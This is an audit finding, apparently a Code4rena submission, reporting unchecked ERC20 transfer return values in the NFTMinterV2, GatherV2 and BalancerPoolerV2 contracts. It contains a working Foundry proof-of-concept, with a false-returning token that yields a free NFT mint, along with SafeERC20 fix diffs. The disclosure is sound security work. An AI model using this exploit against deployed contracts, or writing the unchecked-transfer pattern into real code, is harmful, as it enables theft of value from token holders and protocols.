<!--
C4 Submission Metadata
Title: [M-04] NFTMinterV2 and dispatchers use unchecked ERC20 transfer/transferFrom (no SafeERC20)
Root Cause Link: https://github.com/Behodler/yield-claim-nft/blob/main/src/V2/NFTMinterV2.sol#L180
PoC File: test/poc-M-04.t.sol
-->

## Finding description and impact

### Summary

The V2 payment and dispatch pipeline performs every ERC20 movement with raw `IERC20.transfer` / `IERC20.transferFrom` calls and ignores the boolean return value. OpenZeppelin's `SafeERC20` is imported nowhere in the V2 codebase. This is a systemic weakness that spans `NFTMinterV2` and both live dispatchers (`GatherV2`, `BalancerPoolerV2`). With any ERC20 that signals failure via a `false` return value rather than a revert, every token-movement site silently "succeeds" while no tokens actually move.

### Vulnerability details

The unchecked sites are:

- [`NFTMinterV2.sol#L180`](https://github.com/Behodler/yield-claim-nft/blob/main/src/V2/NFTMinterV2.sol#L180) — user-to-dispatcher payment in `_executeMint`:

```solidity
uint256 balanceBefore = IERC20(token).balanceOf(config.dispatcher);
IERC20(token).transferFrom(msg.sender, config.dispatcher, price);        // return value ignored
uint256 actualReceived = IERC20(token).balanceOf(config.dispatcher) - balanceBefore;
```

- [`NFTMinterV2.sol#L299`](https://github.com/Behodler/yield-claim-nft/blob/main/src/V2/NFTMinterV2.sol#L299) — `emergencyWithdraw` payout:

```solidity
IERC20(token).transfer(msg.sender, balance);                             // return value ignored
```

- [`GatherV2.sol#L54`](https://github.com/Behodler/yield-claim-nft/blob/main/src/V2/dispatchers/GatherV2.sol#L54) — dispatch forwarding to recipient:

```solidity
IERC20(_token).transfer(_recipient, amount);                             // return value ignored
```

- [`BalancerPoolerV2.sol#L66`](https://github.com/Behodler/yield-claim-nft/blob/main/src/V2/dispatchers/BalancerPoolerV2.sol#L66) — primeToken transfer into the Balancer vault during `unlockCallback`:

```solidity
IERC20(_primeToken).transfer(_vault, primeAmount);                       // return value ignored
```

- [`BalancerPoolerV2.sol#L98`](https://github.com/Behodler/yield-claim-nft/blob/main/src/V2/dispatchers/BalancerPoolerV2.sol#L98) — `withdrawBPT` payout:

```solidity
IERC20(_pool).transfer(recipient, amount);                               // return value ignored
```

None of these sites verify that the underlying token call returned `true`. The mint path in particular uses a balance-before/balance-after check that is designed to defend against fee-on-transfer tokens, but it is not a substitute for SafeERC20: if `transferFrom` simply returns `false` without moving tokens and without reverting, the delta is `0` and `actualReceived = 0`. Execution then continues normally: the dispatcher is called with zero and the NFT is minted to the recipient.

The permissionless `registerDispatcher` path (owner-controlled at deploy time but arbitrary per-dispatcher token) means the set of payment tokens is open-ended. A number of well-known ERC20s in circulation (ZRX, HST, EURS historically, and various minor tokens) are documented to return `false` on insufficient balance/allowance instead of reverting. Registering any such token — or any future token with that behaviour, including tokens whose behaviour is upgraded across proxies — automatically makes the mint flow free.

### Impact

- **Silent payment failure across the V2 codebase.** Every ERC20 movement in `NFTMinterV2`, `GatherV2`, and `BalancerPoolerV2` can succeed on paper while no tokens move, allowing attacker-free NFT mints, spurious dispatcher executions, and accounting drift in `BalancerPoolerV2.unlockCallback` (a `false` return from the primeToken transfer would still pass through to `addLiquidity` / `settle` with a stale `actualPrimeInVault` of zero).
- **Root-cause pattern class behind H-01.** This finding is the systemic "no SafeERC20 anywhere" root cause. H-01 reports a specific instance (the removal of the primeToken balance-delta check that would have caught zero-receipt) that materialises the same free-mint outcome via a different trigger. H-01 can be fixed in isolation without touching this systemic issue; conversely, adopting SafeERC20 fixes this class of bug but leaves H-01's specific control-flow issue untouched. Both fixes are required, and they address independent root causes.
- **Severity rationale.** Impact is high (value leak / free mint / accounting drift) but likelihood is moderate because it depends on a non-standard ERC20 being wired as a registered payment token or primeToken. This places the finding in Medium per C4 conventions (value leak with stated external requirements), while H-01 stands alone as High because it requires only standard Behodler tokens.

The PoC in `test/poc-M-04.t.sol` demonstrates the free-mint outcome against `NFTMinterV2` using a minimal false-returning ERC20 (`FalseReturningERC20`). The attacker holds zero tokens and has zero allowance, yet calls `minter.mint(...)` successfully, receives an NFT, and the dispatcher's balance is unchanged:

```
=== M-04 PoC: Unchecked transferFrom returns false -> free mint ===
Attacker token balance after mint: 0
Gather (dispatcher) balance after mint: 0
Attacker NFT balance after mint: 1
=== VULNERABILITY CONFIRMED: free mint with zero payment ===
```

A companion test (`test_M04_SafeERC20WouldRevert`) confirms that swapping the raw call for `SafeERC20.safeTransferFrom` causes the same inputs to revert with `SafeERC20FailedOperation(token)`, verifying that the recommended fix is sufficient.

### Proof of Concept

The PoC is a self-contained Foundry test. Place it at `test/poc-M-04.t.sol` and run with `forge test --match-contract M04PoCTest -vvv`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {NFTMinterV2} from "../src/V2/NFTMinterV2.sol";
import {GatherV2} from "../src/V2/dispatchers/GatherV2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract M04PoCTest is Test {
    NFTMinterV2 public minter;
    FalseReturningERC20 public falseToken;
    GatherV2 public gather;

    address public owner = address(this);
    address public gatherRecipient = address(0xFEED);
    address public attacker = makeAddr("attacker");

    function setUp() public {
        minter = new NFTMinterV2(owner);
        falseToken = new FalseReturningERC20("FalseReturn", "FALSE");
        gather = new GatherV2(address(falseToken), gatherRecipient, owner);

        gather.setMinter(address(minter));
        minter.registerDispatcher(address(gather), 10e18, 0);
    }

    function test_M04_FreeMintFromFalseReturningTransferFrom() public {
        // Attacker holds no tokens and has granted no allowance.
        assertEq(falseToken.balanceOf(attacker), 0);
        assertEq(minter.balanceOf(attacker, 1), 0);
        assertEq(falseToken.allowance(attacker, address(minter)), 0);

        // A correctly implemented ERC20 would revert in transferFrom; a
        // false-returning ERC20 simply returns false and NFTMinterV2 ignores it.
        vm.prank(attacker);
        bool ok = minter.mint(address(falseToken), 1, attacker);
        assertTrue(ok);

        // No tokens moved anywhere...
        assertEq(falseToken.balanceOf(attacker), 0);
        assertEq(falseToken.balanceOf(address(gather)), 0);
        assertEq(falseToken.balanceOf(gatherRecipient), 0);

        // ...but the attacker received a free NFT and totalSupply grew.
        assertEq(minter.balanceOf(attacker, 1), 1);
        assertEq(minter.totalSupply(1), 1);
    }

    function test_M04_SafeERC20WouldRevert() public {
        SafeERC20Harness harness = new SafeERC20Harness();

        vm.prank(attacker);
        vm.expectRevert(
            abi.encodeWithSelector(SafeERC20.SafeERC20FailedOperation.selector, address(falseToken))
        );
        harness.pull(IERC20(address(falseToken)), attacker, address(gather), 10e18);
    }
}

/// ERC20 that returns `false` from transfer/transferFrom when balance or
/// allowance is insufficient, instead of reverting. This is non-standard but
/// is the documented behaviour of several real-world tokens (ZRX, HST, EURS).
contract FalseReturningERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (balanceOf[msg.sender] < amount) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (balanceOf[from] < amount) return false;
        if (allowance[from][msg.sender] < amount) return false;
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract SafeERC20Harness {
    using SafeERC20 for IERC20;

    function pull(IERC20 token, address from, address to, uint256 value) external {
        token.safeTransferFrom(from, to, value);
    }
}
```

Both tests pass:

```
Ran 2 tests for test/poc-M-04.t.sol:M04PoCTest
[PASS] test_M04_FreeMintFromFalseReturningTransferFrom() (gas: ...)
[PASS] test_M04_SafeERC20WouldRevert() (gas: ...)
```

## Recommended mitigation steps

Adopt OpenZeppelin's `SafeERC20` across every V2 ERC20 call site. Concretely:

1. Import SafeERC20 in `NFTMinterV2.sol`, `GatherV2.sol`, and `BalancerPoolerV2.sol`:

```solidity
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

using SafeERC20 for IERC20;
```

2. Replace every raw call:

```solidity
// NFTMinterV2._executeMint (line 180)
- IERC20(token).transferFrom(msg.sender, config.dispatcher, price);
+ IERC20(token).safeTransferFrom(msg.sender, config.dispatcher, price);

// NFTMinterV2.emergencyWithdraw (line 299)
- IERC20(token).transfer(msg.sender, balance);
+ IERC20(token).safeTransfer(msg.sender, balance);

// GatherV2.dispatch (line 54)
- IERC20(_token).transfer(_recipient, amount);
+ IERC20(_token).safeTransfer(_recipient, amount);

// BalancerPoolerV2.unlockCallback (line 66)
- IERC20(_primeToken).transfer(_vault, primeAmount);
+ IERC20(_primeToken).safeTransfer(_vault, primeAmount);

// BalancerPoolerV2.withdrawBPT (line 98)
- IERC20(_pool).transfer(recipient, amount);
+ IERC20(_pool).safeTransfer(recipient, amount);
```

3. Keep the existing balance-before/after pattern in `_executeMint` and `unlockCallback` — it is complementary (FOT protection), not a replacement for return-value checking.

If adding the OpenZeppelin dependency is undesirable in certain dispatcher contexts, the minimum acceptable alternative is to explicitly require the boolean return value, e.g.:

```solidity
require(IERC20(token).transferFrom(msg.sender, config.dispatcher, price), "transferFrom failed");
```

Either approach closes the silent-failure path and eliminates the "return false => free mint / accounting drift" class of bugs. Note that this fix is independent of and complementary to the fix for H-01: both must be applied.
